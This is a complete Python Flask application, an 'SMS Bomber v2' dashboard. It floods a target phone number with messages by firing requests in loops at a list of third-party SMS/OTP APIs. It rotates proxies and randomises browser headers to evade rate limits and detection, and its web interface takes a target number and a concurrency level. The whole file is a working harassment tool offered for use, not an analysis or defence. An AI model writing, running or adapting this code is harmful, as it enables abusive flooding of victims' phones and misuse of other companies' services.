import asyncio
import aiohttp
import json
import random
import threading
import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

state = {"running": False, "sent": 0, "failed": 0, "logs": []}

try:
    with open('working_apis.json', 'r', encoding='utf-8') as f:
        APIS = json.load(f).get('apis', [])
except Exception:
    print("Error: apis.json not found.")
    APIS = []

PROXIES = []
if os.path.exists('working_proxies.txt'):
    with open('working_proxies.txt', 'r') as f:
        PROXIES = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(PROXIES)} proxies from working_proxies.txt")
else:
    print("[-] working_proxies.txt not found. Running without proxies.")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

ACCEPTS = [
    "application/json, text/plain, */*",
    "application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "*/*"
]

LANGS = [
    "en-US,en;q=0.9",
    "bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9"
]

async def hit_api(session, api, target):
    name = api.get('name', 'Unknown')
    url = api.get('url', '')
    method = api.get('method', 'get').lower()
    body_raw = api.get('body', '')
    headers = api.get('headers', {}).copy()
    
    # Header Randomization
    headers['User-Agent'] = random.choice(USER_AGENTS)
    headers['Accept'] = random.choice(ACCEPTS)
    headers['Accept-Language'] = random.choice(LANGS)
    
    if '*****' in url: url = url.replace('*****', target)
    if body_raw and '*****' in body_raw:
        body_raw = body_raw.replace('*****', target)
        
    proxy = random.choice(PROXIES) if PROXIES else None
    
    try:
        kwargs = {'timeout': aiohttp.ClientTimeout(total=15), 'ssl': False}
        if proxy:
            kwargs['proxy'] = proxy
            
        if method == 'post':
            if 'application/json' in headers.get('content-type', ''):
                try: kwargs['json'] = json.loads(body_raw)
                except: kwargs['data'] = body_raw
            else:
                kwargs['data'] = body_raw
            
            async with session.post(url, headers=headers, **kwargs) as res:
                if res.status in [200, 201, 202, 204]:
                    state["sent"] += 1
                    state["logs"].append(f"[+] {name} OK ({res.status})")
                else:
                    state["failed"] += 1
                    state["logs"].append(f"[-] {name} Err ({res.status})")
        else:
            async with session.get(url, headers=headers, **kwargs) as res:
                if res.status in [200, 201, 202, 204]:
                    state["sent"] += 1
                    state["logs"].append(f"[+] {name} OK ({res.status})")
                else:
                    state["failed"] += 1
                    state["logs"].append(f"[-] {name} Err ({res.status})")
    except Exception as e:
        state["failed"] += 1
        err_msg = str(e)[:20]
        state["logs"].append(f"[-] {name} Fail ({err_msg})")
        
    if len(state["logs"]) > 100:
        state["logs"] = state["logs"][-100:]

async def bomber_task(target, loops, concurrency):
    state["running"] = True
    state["sent"] = 0
    state["failed"] = 0
    state["logs"] = ["[*] Initiating Bombing..."]
    
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for loop in range(loops):
            if not state["running"]:
                break
            random.shuffle(APIS)
            tasks = [hit_api(session, api, target) for api in APIS]
            await asyncio.gather(*tasks)
            state["logs"].append(f"[*] Loop {loop + 1}/{loops} Completed")
            await asyncio.sleep(1)
            
    state["logs"].append("[*] Attack Finished.")
    state["running"] = False

def run_async_bombing(target, loops, concurrency):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bomber_task(target, loops, concurrency))

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber Dashboard</title>
    <style>
        :root { --bg: #0f172a; --panel: #1e293b; --accent: #ef4444; --text: #f8fafc; --dim: #94a3b8; }
        body { background: var(--bg); color: var(--text); font-family: system-ui, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 700px; display: grid; gap: 20px; }
        .card { background: var(--panel); padding: 20px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
        h1 { margin-top: 0; color: var(--accent); text-align: center; }
        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; border-radius: 8px; color: white; margin-bottom: 10px; box-sizing: border-box; }
        .row { display: flex; gap: 10px; }
        button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-start { background: var(--accent); color: white; }
        .btn-start:hover { background: #dc2626; }
        .btn-stop { background: #475569; color: white; }
        .btn-stop:hover { background: #334155; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .stats { display: flex; justify-content: space-between; text-align: center; font-size: 1.2rem; margin-top: 15px; padding-top: 15px; border-top: 1px solid #334155; }
        .stat-sent { color: #22c55e; font-weight: bold; }
        .stat-failed { color: #ef4444; font-weight: bold; }
        #logs { background: #000; color: #22c55e; font-family: monospace; padding: 15px; border-radius: 8px; height: 300px; overflow-y: auto; font-size: 0.85rem; white-space: pre-wrap; }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ SMS Bomber v2 ⚡</h1>
    <div class="card">
        <input type="text" id="target" placeholder="Target Number (e.g., 017XXXXXXXX)">
        <div class="row">
            <input type="number" id="loops" value="5" placeholder="Loops">
            <input type="number" id="concurrency" value="100" placeholder="Threads/Concurrency">
        </div>
        <div class="row">
            <button class="btn-start" id="startBtn" onclick="startBomb()">Start Bombing</button>
            <button class="btn-stop" id="stopBtn" onclick="stopBomb()" disabled>Stop</button>
        </div>
        <div class="stats">
            <div>Sent: <span class="stat-sent" id="sent">0</span></div>
            <div>Failed: <span class="stat-failed" id="failed">0</span></div>
        </div>
    </div>
    <div class="card" style="padding:0; background:none; border:none;">
        <div id="logs">Waiting to start...</div>
    </div>
</div>
<script>
    let isRunning = false;
    let interval;

    async function startBomb() {
        const target = document.getElementById('target').value;
        const loops = document.getElementById('loops').value;
        const concurrency = document.getElementById('concurrency').value;
        
        if(!target) return alert('Enter target number!');

        const res = await fetch('/start', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, loops, concurrency})
        });
        const data = await res.json();
        if(data.status === 'started') {
            isRunning = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            interval = setInterval(checkStatus, 1000);
        }
    }

    async function stopBomb() {
        await fetch('/stop', {method: 'POST'});
        stopUI();
    }

    function stopUI() {
        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        clearInterval(interval);
    }

    async function checkStatus() {
        const res = await fetch('/status');
        const data = await res.json();
        document.getElementById('sent').innerText = data.sent;
        document.getElementById('failed').innerText = data.failed;
        
        const logsEl = document.getElementById('logs');
        logsEl.innerText = data.logs.join('\\n');
        logsEl.scrollTop = logsEl.scrollHeight;

        if(!data.running && isRunning) {
            stopUI();
        }
    }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start():
    if state["running"]:
        return jsonify({"error": "Already running"}), 400
    data = request.json
    target = data.get('target')
    loops = int(data.get('loops', 5))
    concurrency = int(data.get('concurrency', 100))
    
    threading.Thread(target=run_async_bombing, args=(target, loops, concurrency)).start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop():
    state["running"] = False
    return jsonify({"status": "stopped"})

@app.route('/status')
def status():
    return jsonify({
        "running": state["running"],
        "sent": state["sent"],
        "failed": state["failed"],
        "logs": state["logs"][-30:]
    })

if __name__ == '__main__':
    print("\\n[+] Install requirements: pip3 install flask aiohttp")
    print("[+] Dashboard running at: http://localhost:5000\\n")
    app.run(host='0.0.0.0', port=5000, debug=False)
